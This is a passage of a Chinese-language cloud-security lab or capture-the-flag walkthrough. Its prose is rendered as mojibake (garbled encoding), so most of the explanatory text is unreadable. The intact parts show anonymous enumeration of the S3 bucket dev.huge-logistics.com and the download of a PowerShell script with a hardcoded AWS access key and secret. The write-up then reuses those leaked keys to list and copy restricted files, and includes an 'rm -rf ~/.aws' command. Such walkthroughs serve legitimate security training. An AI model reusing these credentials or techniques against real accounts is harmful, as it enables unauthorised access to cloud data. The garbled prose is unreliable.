http">https://s3.amazonaws.com/dev.huge-logistics.com/<br></code></pre></td></tr></table></figure><p><img src="/image/image_gEE7SJxGS8.png"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒAWS CLI åœ¨è¯·æ±‚ä¸­åŒ…å«<code>prefix=</code>ï¼ˆç©ºå‰ç¼€ï¼‰å’Œ<code>delimiter=/</code>ï¼Œè€Œæˆ‘ä»¬åˆšåˆšé€šè¿‡æµè§ˆå™¨å‘é€ GET è¯·æ±‚ä¸åŒ…å«è¿™äº›å‚æ•°ã€‚æ‰€ä»¥ï¼Œè‹¥è¦åœ¨æµè§ˆå™¨ä¸­åˆ—å‡º S3 å­˜å‚¨æ¡¶çš„æ ¹ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ URL ä¸­æ·»åŠ è¿™äº›å‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://dev.huge-logistics.com.s3.amazonaws.com/?prefix=&amp;delimiter=/<br></code></pre></td></tr></table></figure><p><img src="/image/image_U03HwkAK2I.png"></p><p>æ‹“å±•ä¸€ä¸‹ï¼Œå‰é¢ä¸¤ä¸ªè¯·æ±‚éƒ½è®¿é—®å¤±è´¥ï¼Œè¿™æ˜¯å› ä¸ºå­˜å‚¨æ¡¶è®¾ç½®äº†ä»¥ä¸‹ç­–ç•¥ï¼Œè¯¥ç­–ç•¥å…è®¸æ‰€æœ‰äººï¼ˆåŒ…æ‹¬åŒ¿åç”¨æˆ·ï¼‰å¯¹ S3 æ¡¶<code>dev.huge-logistics.com</code>æ‰§è¡Œ<code>ListBucket</code>æ“ä½œï¼Œä½†ä»…é™åˆ—å‡ºï¼š</p><ul><li>æ ¹ç›®å½•ï¼ˆ<code>&quot;&quot;</code>ï¼‰</li><li><code>shared/</code>ç›®å½•</li><li><code>static/</code>ç›®å½•</li></ul><p>å¹¶ä¸”åªæ˜¾ç¤ºâ€œç›®å½•çº§åˆ«â€å†…å®¹ï¼Œä¸ä¼šåˆ—å‡ºæ·±å±‚æ–‡ä»¶ç»“æ„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ListBucketRootAndShared&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::dev.huge-logistics.com&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringEquals&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                        <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-string">&quot;shared/&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-string">&quot;static/&quot;</span><br>                    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;s3:delimiter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>å­—æ®µ</th><th>å«ä¹‰</th><th>ç¤ºä¾‹å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>`Sid`</td><td>è¯­å¥ ID</td><td>`ListBucketRootAndShared`</td><td>æ ‡è¯†è¯¥è¯­å¥ï¼Œå¯é€‰å­—æ®µï¼Œä¸»è¦ç”¨äºè¯†åˆ«ç­–ç•¥è¯­å¥ã€‚</td></tr><tr><td>`Effect`</td><td>æ‰§è¡Œæ•ˆæœ</td><td>`Allow`</td><td>è¡¨ç¤ºå…è®¸è¯¥æ“ä½œï¼ˆä¹Ÿå¯èƒ½ä¸º`Deny`ï¼‰ã€‚</td></tr><tr><td>`Principal`</td><td>æ“ä½œçš„ä¸»ä½“</td><td><code>*</code></td><td>è¡¨ç¤º<strong>æ‰€æœ‰ç”¨æˆ·</strong>éƒ½å¯ä»¥æ‰§è¡Œè¯¥æ“ä½œï¼ˆåŒ…å«åŒ¿åç”¨æˆ·ï¼‰ã€‚</td></tr><tr><td>`Action`</td><td>å…è®¸çš„æ“ä½œ</td><td>`s3:ListBucket`</td><td>å…è®¸æ‰§è¡Œåˆ—å‡ºæ¡¶å†…å¯¹è±¡é”®ï¼ˆæ–‡ä»¶åï¼‰çš„æ“ä½œã€‚</td></tr><tr><td>`Resource`</td><td>ä½œç”¨å¯¹è±¡</td><td>`arn:aws:s3:::dev.huge-logistics.com`</td><td>æŒ‡å®šç­–ç•¥ä½œç”¨çš„ S3 å­˜å‚¨æ¡¶ï¼ˆæ³¨æ„ï¼šè¿™æ˜¯æ¡¶ï¼Œä¸æ˜¯æ–‡ä»¶ï¼‰ã€‚</td></tr><tr><td>`Condition`</td><td>æ¡ä»¶é™åˆ¶</td><td>å¦‚ä¸‹æ‰€ç¤º</td><td>åªæœ‰æ»¡è¶³ä»¥ä¸‹å­æ¡ä»¶æ—¶ï¼Œæ‰èƒ½æ‰§è¡Œæ“ä½œã€‚</td></tr><tr><td>â””â”€`s3:prefix`</td><td>è¢«åˆ—å‡ºçš„å‰ç¼€è·¯å¾„</td><td>`[â€œâ€, â€œshared&#x2F;â€œ, â€œstatic&#x2F;â€œ]`</td><td>åªå…è®¸åˆ—å‡ºæ ¹ç›®å½•ã€`shared&#x2F;`å’Œ`static&#x2F;`ç›®å½•ä¸­çš„å¯¹è±¡ã€‚</td></tr><tr><td>â””â”€`s3:delimiter`</td><td>åˆ†éš”ç¬¦</td><td>`â€œ&#x2F;â€œ`</td><td>å°†å¯¹è±¡æŒ‰â€œæ–‡ä»¶å¤¹â€å±‚æ¬¡ç»“æ„åˆ’åˆ†ï¼ˆå¸¸ç”¨äºç›®å½•æµè§ˆæ•ˆæœï¼‰ã€‚</td></tr></tbody></table><blockquote><p>å¾ˆå¤šæµè§ˆå™¨é»˜è®¤ä»¥çº¯æ–‡æœ¬çš„æ–¹å¼å±•ç¤º XML æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç½‘é¡µæºç ï¼Œè·å¾— XML çš„å®Œæ•´ç»“æ„ï¼Œè¿™é‡Œå·²ç»é€šè¿‡ <a href="https://sourceforge.net/projects/xml-viewer-plus/" title="XML Viewer Plus">XML Viewer Plus</a> æ’ä»¶è¿›è¡Œäº†æ ¼å¼åŒ–</p></blockquote><h3 id="6-3-åˆ©ç”¨-AWS-CLI-è·å–æ›´å¤šä¿¡æ¯"><a href="#6-3-åˆ©ç”¨-AWS-CLI-è·å–æ›´å¤šä¿¡æ¯" class="headerlink" title="6.3 åˆ©ç”¨ AWS CLI è·å–æ›´å¤šä¿¡æ¯"></a>6.3 åˆ©ç”¨ AWS CLI è·å–æ›´å¤šä¿¡æ¯</h3><blockquote><p>åœ¨åŸºäº Debian çš„ Linux å‘è¡Œç‰ˆï¼ˆä¾‹å¦‚ Ubuntuï¼‰ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤ <code>apt install awscli</code>å®‰è£… AWS CLIã€‚å¯¹äºå…¶ä»–å‘è¡Œç‰ˆå’Œæ“ä½œç³»ç»Ÿï¼Œè¯·å‚é˜… AWS<a href="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html" title="æ–‡æ¡£">æ–‡æ¡£</a>ã€‚</p></blockquote><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ AWS CLI æ¥æ£€æŸ¥å­˜å‚¨æ¡¶äº†ã€‚å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºå…¶å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com --no-sign-request<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬å®‰è£…çš„ AWS CLI æ˜¯ v2 ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬é»˜è®¤æƒ…å†µä¸‹ä¼šå¯¹è¯·æ±‚è¿›è¡Œç­¾åã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡<code>--no-sign-request</code> æ¥å‘é€æœªç­¾åçš„è¯·æ±‚æ¥æµ‹è¯•å­˜å‚¨æ¡¶çš„å…¬å…±è®¿é—®ã€‚å¦‚æœä¸æŒ‡å®šè¯¥æ ‡å¿—ï¼Œé‚£ä¹ˆ AWS CLI å°†ä½¿ç”¨æœ¬åœ°é…ç½®çš„ AWS å‡­è¯ã€‚</p><table><thead><tr><th>å­—æ®µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>aws</td><td>å·¥å…·çš„åç§°</td></tr><tr><td>s3</td><td>ä¸ä¹‹äº¤äº’çš„æœåŠ¡åç§°ï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯ Amazon S3</td></tr><tr><td>ls</td><td>æ‰§è¡Œçš„æ“ä½œï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯åˆ—å‡ºå†…å®¹</td></tr><tr><td>URL</td><td>`s3:&#x2F;&#x2F;dev.huge-logistics.com`æŒ‡çš„æ˜¯ S3 å­˜å‚¨æ¡¶çš„åç§°ã€‚</td></tr><tr><td>s3:&#x2F;&#x2F;</td><td>åˆ—å‡ºå­˜å‚¨æ¡¶æ—¶ä¸å¿…æŒ‡å®šå‰ç¼€ï¼Œä½†å…¶ä»–æ“ä½œï¼ˆå¦‚å¤åˆ¶æ–‡ä»¶`cp`ï¼‰éœ€è¦æ­¤å‰ç¼€ã€‚</td></tr><tr><td>--no-sign-request</td><td>ç¦æ­¢å¯¹è¯·æ±‚è¿›è¡Œç­¾å</td></tr></tbody></table><blockquote><p>AWS CLI v1 é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸ä¼šå¯¹è¯·æ±‚è¿›è¡Œç­¾åçš„ï¼Œè‹¥ä¹‹å‰æœ‰é€šè¿‡ aws configure è¿›è¡Œäº†é…ç½®ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ <code>rm -rf ~/.aws</code> è¿›è¡Œåˆ é™¤ã€‚</p></blockquote><p>å‘½ä»¤å·²æˆåŠŸæ‰§è¡Œäº†ï¼Œè¿™è¡¨æ˜ S3 bucket å·²å¼€æ”¾ï¼Œå¯ä¾›æ•´ä¸ªäº’è”ç½‘è®¿é—®ã€‚è¿™åœ¨ç”¨äºå­˜å‚¨å…¬ç½‘å†…å®¹çš„æƒ…å†µä¸‹æ˜¯åˆç†çš„ï¼Œä½†å®ƒä¼¼ä¹è¿˜åŒ…å«å…¶ä»–ç›®å½•â€¦â€¦</p><p><img src="/image/image_6yUovGoDsQ.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°è¯•é€šè¿‡<code>--recursive</code>åˆ—å‡ºæ‰€æœ‰çš„ç›®å½•ï¼Œä½†ç”±äºè®¿é—®è¢«æ‹’ç»è€Œå¤±è´¥ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com --no-sign-request --recursive<br></code></pre></td></tr></table></figure><p><img src="/image/image_hOSpgRLrUA.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±ä¸€ä¸€åˆ—å‡ºè¿™äº›ç›®å½•å§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/admin/ --no-sign-request<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/migration-files/ --no-sign-request<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/shared/ --no-sign-request<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/static/ --no-sign-request<br><br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼Œ<code>admin</code> ç›®å½•å’Œ <code>migration</code> ç›®å½•ä¸å…è®¸è®¿é—®ï¼Œ<code>static</code> ç›®å½•ä¸‹ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¯èƒ½å°±åªæœ‰<code>migration-files</code> ç›®å½•æœ‰ç‚¹æˆäº†ã€‚</p><p><img src="/image/image_Agsg6Xph6j.png"></p><h3 id="6-4-ä¸‹è½½å¹¶åˆ†æå‹ç¼©åŒ…"><a href="#6-4-ä¸‹è½½å¹¶åˆ†æå‹ç¼©åŒ…" class="headerlink" title="6.4 ä¸‹è½½å¹¶åˆ†æå‹ç¼©åŒ…"></a>6.4 ä¸‹è½½å¹¶åˆ†æå‹ç¼©åŒ…</h3><p>æˆ‘ä»¬å…ˆä¸‹è½½ä¸‹æ¥è¿›è¡Œåˆ†æã€‚å°†å‹ç¼©åŒ…è¿›è¡Œè§£å‹è¿‡åï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª PowerShell è„šæœ¬ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request<br>unzip hl_migration_project.zip -d hl_migration_project<br></code></pre></td></tr></table></figure><p><img src="/image/image_WFbY6aybec.png"></p><p>è¯¥è„šæœ¬åŒ…å«äº†ç¡¬ç¼–ç çš„ AWS å¯†é’¥ï¼Œè„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯è·å–å­˜å‚¨åœ¨ XML æ–‡ä»¶ä¸­çš„ secretï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ AWS Secrets Manager ä¸­ã€‚Secrets Manager æ˜¯ä¸€é¡¹æœåŠ¡ï¼Œå¯å¸®åŠ©å®‰å…¨åœ°å­˜å‚¨ã€ç®¡ç†å’Œæ£€ç´¢ API å¯†é’¥å’Œæ•°æ®åº“å‡­è¯ç­‰å¯†é’¥ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># AWS Configuration</span><br><span class="hljs-comment"># AWS é…ç½®</span><br><span class="hljs-variable">$accessKey</span> = <span class="hljs-string">&quot;AKIA3SFMDAPOWOWKXEHU&quot;</span><br><span class="hljs-variable">$secretKey</span> = <span class="hljs-string">&quot;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&quot;</span><br><span class="hljs-variable">$region</span> = <span class="hljs-string">&quot;us-east-1&quot;</span><br><br><span class="hljs-comment"># Set up AWS hardcoded credentials</span><br><span class="hljs-comment"># è®¾ç½® AWS ç¡¬ç¼–ç å‡­è¯</span><br><span class="hljs-built_in">Set-AWSCredentials</span> <span class="hljs-literal">-AccessKey</span> <span class="hljs-variable">$accessKey</span> <span class="hljs-literal">-SecretKey</span> <span class="hljs-variable">$secretKey</span><br><br><span class="hljs-comment"># Set the AWS region</span><br><span class="hljs-comment"># è®¾ç½® AWS åŒºåŸŸ</span><br><span class="hljs-built_in">Set-DefaultAWSRegion</span> <span class="hljs-literal">-Region</span> <span class="hljs-variable">$region</span><br><br><span class="hljs-comment"># Read the secrets from export.xml</span><br><span class="hljs-comment"># ä» export.xml ä¸­è¯»å– secret</span><br>[<span class="hljs-built_in">xml</span>]<span class="hljs-variable">$xmlContent</span> = <span class="hljs-built_in">Get-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;export.xml&quot;</span><br><br><span class="hljs-comment"># Output log file</span><br><span class="hljs-comment"># è¾“å‡ºæ—¥å¿—æ–‡ä»¶</span><br><span class="hljs-variable">$logFile</span> = <span class="hljs-string">&quot;upload_log.txt&quot;</span><br><br><span class="hljs-comment"># Error handling with retry logic</span><br><span class="hljs-comment"># ä½¿ç”¨é‡è¯•é€»è¾‘è¿›è¡Œé”™è¯¯å¤„ç†</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">TryUploadSecret</span><span class="hljs-params">(<span class="hljs-variable">$secretName</span>, <span class="hljs-variable">$secretValue</span>)</span></span> &#123;<br>    <span class="hljs-variable">$retries</span> = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$retries</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-built_in">New-SECSecret</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$secretName</span> <span class="hljs-literal">-SecretString</span> <span class="hljs-variable">$secretValue</span><br>            <span class="hljs-variable">$logEntry</span> = <span class="hljs-string">&quot;Successfully uploaded secret: <span class="hljs-variable">$secretName</span> with ARN: <span class="hljs-variable">$</span>(<span class="hljs-variable">$result</span>.ARN)&quot;</span><br>            <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$logEntry</span><br>            <span class="hljs-built_in">Add-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$logFile</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$logEntry</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$true</span><br>        &#125; <span class="hljs-keyword">catch</span> &#123;<br>            <span class="hljs-variable">$retries</span><span class="hljs-literal">--</span><br>            <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed attempt to upload secret: <span class="hljs-variable">$secretName</span>. Retries left: <span class="hljs-variable">$retries</span>. Error: <span class="hljs-variable">$_</span>&quot;</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$false</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$secretNode</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$xmlContent</span>.Secrets.Secret) &#123;<br>    <span class="hljs-comment"># Implementing concurrency using jobs</span><br>    <span class="hljs-comment"># ä½¿ç”¨ä½œä¸šå®ç°å¹¶å‘</span><br>    <span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<br>        <span class="hljs-keyword">param</span>(<span class="hljs-variable">$secretName</span>, <span class="hljs-variable">$secretValue</span>)<br>        TryUploadSecret <span class="hljs-literal">-secretName</span> <span class="hljs-variable">$secretName</span> <span class="hljs-literal">-secretValue</span> <span class="hljs-variable">$secretValue</span><br>    &#125; <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$secretNode</span>.Name, <span class="hljs-variable">$secretNode</span>.Value<br>&#125;<br><br><span class="hljs-comment"># Wait for all jobs to finish</span><br><span class="hljs-comment"># ç­‰å¾…æ‰€æœ‰ä½œä¸šå®Œæˆ</span><br><span class="hljs-variable">$jobs</span> = <span class="hljs-built_in">Get-Job</span><br><span class="hljs-variable">$jobs</span> | <span class="hljs-built_in">Wait-Job</span><br><br><span class="hljs-comment"># Retrieve and display job results</span><br><span class="hljs-comment"># è·å–å¹¶æ˜¾ç¤ºä½œä¸šç»“æœ</span><br><span class="hljs-variable">$jobs</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-built_in">Receive-Job</span> <span class="hljs-literal">-Job</span> <span class="hljs-variable">$_</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> <span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed to upload secret: <span class="hljs-variable">$</span>(<span class="hljs-variable">$_</span>.Name) after multiple retries.&quot;</span><br>    &#125;<br>    <span class="hljs-comment"># Clean up the job</span><br>    <span class="hljs-comment"># æ¸…ç†ä½œä¸š</span><br>    <span class="hljs-built_in">Remove-Job</span> <span class="hljs-literal">-Job</span> <span class="hljs-variable">$_</span><br>&#125;<br><br><span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;Batch upload complete!&quot;</span><br><br><br><span class="hljs-comment"># Install-Module -Name AWSPowerShell -Scope CurrentUser -Force</span><br><span class="hljs-comment"># å®‰è£…æ¨¡å— -Name AWSPowerShell -Scope CurrentUser -Force</span><br><span class="hljs-comment"># .\migrate_secrets.ps1%                                                                                                                            </span><br></code></pre></td></tr></table></figure><p>é™¤äº† access key å’Œ secret key ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä»è„šæœ¬ä¸­çœ‹åˆ° region ä¸º<code>us-east-1</code>ã€‚å¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œåœ¨è®¾ç½®å¯†é’¥æ—¶ï¼Œäº†è§£ä½¿ç”¨çš„æ˜¯å“ªä¸ªåŒºåŸŸæ˜¯éå¸¸æœ‰ç”¨çš„ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ï¼Œä» S3 å­˜å‚¨æ¡¶ä¸­è·å–æ›´å¤šçš„çº¿ç´¢ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -I https://s3.amazonaws.com/dev.huge-logistics.com/<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä»…è¿”å›è¯·æ±‚å¤´ï¼Œè¿™è¿›ä¸€æ­¥è¡¨æ˜å­˜å‚¨æ¡¶æ˜¯åœ¨<code>us-east-1</code>åŒºåŸŸä¸­åˆ›å»ºçš„ã€‚</p><p><img src="/image/image_kln-iPRzUN.png"></p><h3 id="6-5-åˆ©ç”¨æ³„éœ²çš„-AWS-å¯†é’¥æå‡æƒé™"><a href="#6-5-åˆ©ç”¨æ³„éœ²çš„-AWS-å¯†é’¥æå‡æƒé™" class="headerlink" title="6.5 åˆ©ç”¨æ³„éœ²çš„ AWS å¯†é’¥æå‡æƒé™"></a>6.5 åˆ©ç”¨æ³„éœ²çš„ AWS å¯†é’¥æå‡æƒé™</h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤è®¾ç½® AWS CLI çš„å¯†é’¥äº†ï¼Œå…¶ä¸­ access key ç›¸å½“äºç”¨æˆ·åï¼Œsecret key ç›¸å½“äºå¯†ç ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br></code></pre></td></tr></table></figure><p><img src="/image/image_P-PBlPXpIB.png"></p><p>æˆ‘ä»¬ä¸éœ€è¦åƒåœ¨ Linux å’Œ Windows ä¸Šé‚£æ ·è¿è¡Œ<code>whoami</code>ï¼Œè€Œæ˜¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤ï¼Œå†æ¬¡éªŒè¯æˆ‘ä»¬çš„èº«ä»½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure><p>å‘½ä»¤æ˜¾ç¤ºæˆ‘ä»¬çš„ç”¨æˆ·å<code>pam-test</code>ï¼Œå†æ ¹æ®è„šæœ¬çš„æ€§è´¨ï¼Œæˆ‘ä»¬å¯ä»¥å‡è®¾ pam ä»£è¡¨ç‰¹æƒè®¿é—®ç®¡ç† (Privilege Access Management)ã€‚</p><p><img src="/image/image_LEqyQ34_va.png"></p><p>å› æ­¤ï¼Œæˆ‘ä»¬å†å°è¯•åˆ—å‡ºåˆšåˆšæ— æ³•è®¿é—®çš„ç›®å½•ã€‚è¿™é‡Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»æ‹¥æœ‰æœ‰æ•ˆçš„ AWS å‡­è¯äº†ï¼Œå¯ä»¥åˆ é™¤<code>--no-sign-request</code> æ ‡å¿—ï¼Œä½¿ç”¨æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„å¯†é’¥å¯¹è¯·æ±‚è¿›è¡Œç­¾åäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/admin/<br>aws s3 <span class="hljs-built_in">ls</span> s3://dev.huge-logistics.com/migration-files/<br><br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸€äº›å¸¸è§„çš„èµ„æ–™æ–‡ä»¶ä¹‹å¤–ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† flag æ–‡ä»¶ã€power shell æ–‡ä»¶ä»¥åŠ xml æ–‡ä»¶ã€‚</p><p><img src="/image/image_5s4pvDgS7j.png"></p><p>æˆ‘ä»¬å…ˆå°†å®ƒä»¬ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå†è¿›è¡Œåˆ†æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/admin/flag.txt .<br>aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/migration-files/migrate_secrets.ps1 .<br>aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/migration-files/test-export.xml .<br><br></code></pre></td></tr></table></figure><p>ä½†å½“å‰çš„ AWS å‡­è¯æ— æ³•ä¸‹è½½ flag æ–‡ä»¶ã€‚æˆ‘ä»¬åªèƒ½ä»å…¶å®ƒçš„ä¸¤ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°çº¿ç´¢äº†ã€‚</p><p><img src="/image/image_MrxTMO2kWK.png"></p><h3 id="6-6-åˆ©ç”¨æ³„éœ²çš„-AWS-å¯†é’¥å†æ¬¡ææƒ"><a href="#6-6-åˆ©ç”¨æ³„éœ²çš„-AWS-å¯†é’¥å†æ¬¡ææƒ" class="headerlink" title="6.6 åˆ©ç”¨æ³„éœ²çš„ AWS å¯†é’¥å†æ¬¡ææƒ"></a>6.6 åˆ©ç”¨æ³„éœ²çš„ AWS 